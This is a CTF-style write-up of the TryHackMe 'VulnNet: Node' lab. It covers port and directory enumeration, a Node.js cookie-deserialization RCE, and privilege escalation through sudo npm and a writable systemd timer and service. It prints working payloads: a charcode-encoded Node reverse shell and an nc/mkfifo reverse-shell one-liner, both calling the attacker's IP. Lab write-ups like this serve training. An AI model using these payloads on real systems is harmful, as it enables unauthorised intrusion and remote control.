---
layout: post
title: "THM VulnNet: Node Writeup"
date: "2021-04-02"
categories: tryhackme
---
## Room
**Name**: VulnNet: Node

**Location**: [TryHackMe](https://tryhackme.com/room/vulnnetnode)

**Description**: After the previous breach, VulnNet Entertainment states it won't happen again. Can you prove they're wrong?

**Difficulty**: Easy

## Network Enumeration
First of all, let's start our initial enumeration of our target using `nmap`.

```sh
# Nmap 7.91 scan initiated Thu Apr  8 23:56:14 2021 as: nmap -sC -sV -oN initial -vv 10.10.192.140
Nmap scan report for 10.10.192.140
Host is up, received conn-refused (0.38s latency).
Scanned at 2021-04-08 23:56:14 PST for 24s
Not shown: 999 closed ports
Reason: 999 conn-refused
PORT     STATE SERVICE REASON  VERSION
8080/tcp open  http    syn-ack Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr  8 23:56:38 2021 -- 1 IP address (1 host up) scanned in 23.91 seconds
```

After that, we'll enumerate the rest of the ports (all 65,535).

```sh
# Nmap 7.91 scan initiated Thu Apr  8 23:58:13 2021 as: nmap -sC -sV -oN allports -p- -vv 10.10.192.140
Nmap scan report for 10.10.192.140
Host is up, received conn-refused (0.38s latency).
Scanned at 2021-04-08 23:58:13 PST for 889s
Not shown: 65534 closed ports
Reason: 65534 conn-refused
PORT     STATE SERVICE REASON  VERSION
8080/tcp open  http    syn-ack Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr  9 00:13:02 2021 -- 1 IP address (1 host up) scanned in 888.99 seconds
```

Seems that only port 8080 is open, let's proceed to the next step.

## Web App Enumeration
We now know there's a web application running on port `8080` and is using *NodeJS Express framework*, we'll now proceed with enumerating this web application.

Let's start our web app enumeration by looking for interesting directories using GoBuster.

```sh
$ gobuster dir -u http://10.10.192.140:8080 -w /usr/share/wordlists/dirb/common.txt

[CLIPPED]
===============================================================
2021/04/09 00:05:03 Starting gobuster
===============================================================
/css (Status: 301)
/img (Status: 301)
/login (Status: 200)
/Login (Status: 200)
===============================================================
2021/04/09 00:08:01 Finished
===============================================================
```

We now know that we have a login page located at `/login`, visiting the website using our browser we are greeted by a very basic looking blog.

![](/assets/images/thm-vulnnet-node/screenshot_1.png)

Looking around we noticed posts with the following authors however we cannot bruteforce it yet as we don't have an email format to use.

```
Tilo Mitra
Eric Ferraiuolo
Reid Burke
Andrew Wooldridge
```

Moving forward, we have our Burp Suite open so we can analyze our HTTP traffic. We can see that we have a Cookie and is potentially encoded with base64. Send this to the Repeater module, we'll use it later.

```
GET / HTTP/1.1
Host: 10.10.192.140:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.192.140:8080
Connection: close
Cookie: session=eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```

Let's try to decode the cookie.

```sh
$ echo "eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==" | base64 --decode
```

We get the result `{"username":"Guest","isGuest":true,"encoding": "utf-8"}`.

## Exploitation
Let's try changing the value of `username` key from Guest to `pwn` and encode it back to base64.

```sh
$ echo '{"username":"pwn","isGuest":true,"encoding": "utf-8"}' | base64
```

Let's change our cookie value using the Repeater module. Clicking "Render" will render the web page, we noticed that "Welcome, Guest" has been changed to "Welcome, pwn". We found a potential vector.

![](/assets/images/thm-vulnnet-node/screenshot_2.png)

After being stucked for almost half an hour, I came across this [article](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)
which talks about a vulnerability on NodeJS deserialization.

Reading through the article, I decided to use the Decoder module to encode this payload to base64 `{"username":"_$$ND_FUNC$$_function (){require('child_process').exec('ping -c2 10.4.32.195', function(error, stdout, stderr) { console.log(stdout) });}()","isGuest":true,"encoding": "utf-8"}`, this will ping my machine confirming we can run system commands. We get the following.

```sh
$ sudo tcpdump -i tun0 icmp

listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
01:06:21.444394 IP 10.10.192.140 > 10.4.32.195: ICMP echo request, id 1057, seq 1, length 64
01:06:21.444408 IP 10.4.32.195 > 10.10.192.140: ICMP echo reply, id 1057, seq 1, length 64
01:06:22.445764 IP 10.10.192.140 > 10.4.32.195: ICMP echo request, id 1057, seq 2, length 64
01:06:22.445779 IP 10.4.32.195 > 10.10.192.140: ICMP echo reply, id 1057, seq 2, length 64
```

RCE confirmed 🎉! Let's proceed with creating a reverse shell payload, I used [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py).

```sh
$ python nodejsshell.py 10.4.32.195 1234

[+] LHOST = 10.4.32.195
[+] LPORT = 1234
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,52,46,51,50,46,49,57,53,34,59,10,80,79,82,84,61,34,49,50,51,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```

Copy the payload and use the Decoder module to encode the new payload to base64 `{"username":"_$$ND_FUNC$$_function (){ reverse shell payload here }()","isGuest":true,"encoding": "utf-8"}`.

Execute the new payload using the Repeater module. Make sure you have an active listener on your attack machine beforehand.

```sh
$ rlwrap nc -nlvp 1234 
listening on [any] 1234 ...
connect to [10.4.32.195] from (UNKNOWN) [10.10.192.140] 37852
Connected!
whoami
www
```

We're in!

## Priv Esc from www-data to serv-manage
Now that we have a reverse shell, let's get ourselves a better shell.

```sh
python -c 'import pty; pty.spawn("/bin/sh")'
```

Let's proceed with enumerating for privilege escalation.

```sh
$ sudo -l

Matching Defaults entries for www on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on vulnnet-node:
    (serv-manage) NOPASSWD: /usr/bin/npm
```

We have sudo access with `/usr/bin/npm` as the user `serv-manage`.

```sh
$ sudo -u serv-manage npm --version

6.14.10
```

Now that's done, we can go to [GTFOBins](https://gtfobins.github.io/) and search for `npm` exploit. Let's follow what GTFOBins recommends us to do.

```sh
$ TF=$(mktemp -d)
$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
$ chmod 777 $TF # i added this to avoid permission problems
$ sudo -u serv-manage npm -C $TF i

> @ preinstall /tmp/tmp.EtxvAjaBSF
> /bin/sh

whoami
serv-manage
```

And we're in! Let's get that flag

```sh
cat /home/serv-manage/user.txt
THM{REDACTED}
```

## Priv Esc from serv-manage to root
Now that we escalated our privileges, let's get ourselves a better shell.

```sh
python -c 'import pty; pty.spawn("/bin/sh")'
```

Let's proceed with enumerating for privilege escalation.

```sh
$ sudo -l

Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

We have sudo access with `/bin/systemctl` as `root` on the following files: `vulnnet-auto.timer`, `stop vulnnet-auto.timer`, and `daemon-reload`.

Let's locate where this files are and change directory to their location.

```sh
$ locate vulnnet-auto.timer
/etc/systemd/system/vulnnet-auto.timer

$ cd /etc/systemd/system && ls -la
[CLIPPED]
-rw-rw-r--  1 root serv-manage  167 Jan 24 16:59 vulnnet-auto.timer
-rw-rw-r--  1 root serv-manage  197 Jan 24 21:40 vulnnet-job.service
```

Let's investigate the contents of these files, let's do `vulnnet-auto.timer` first.

```sh
$ cat vulnnet-auto.timer

[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```

Now let's investigate `vulnnet-job.service`.

```sh
$ cat vulnnet-job.service

[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target
```

We concluded that `vulnnet-auto.timer` runs immediately `vulnnet-job.service` after booting and every 30 minutes. We also concluded that `vulnnet-job.service` is running `/bin/df` through `ExecStart`, the job now is to escalate to `root` user through this service. Let's do that now.

Running `vi` or `nano` becomes a problem possibly due to tty/pty size? So let's use the `echo` workaround. Let's first change the value of `vulnnet-auto.timer`.

```sh
$ echo "[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
OnCalendar=*:0/1
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target" > vulnnet-auto.timer
```

Let's move on to changing the value of `vulnnet-job.service`.

```sh
$ echo "[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/tmp/shell

[Install]
WantedBy=multi-user.target" > vulnnet-job.service
```

Let's not forget to create our reverse shell instance.

```sh
$ echo "#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.32.195 4242 >/tmp/f" > /tmp/shell

$ chmod +x /tmp/shell
```

Now that everything is properly setup, let's now restart the services. ake sure you have an active listener on your attack machine beforehand.

```sh
$ sudo -u root /bin/systemctl stop vulnnet-auto.timer
$ sudo -u root /bin/systemctl daemon-reload
$ sudo -u root /bin/systemctl start vulnnet-auto.timer
```

and we're root!

```sh
$ rlwrap nc -nlvp 4242 
listening on [any] 4242 ...
connect to [10.4.32.195] from (UNKNOWN) [10.10.192.140] 34666

whoami
root
```

Let's get that flag!

```sh
$ cat /root/root.txt
THM{REDACTED}
```
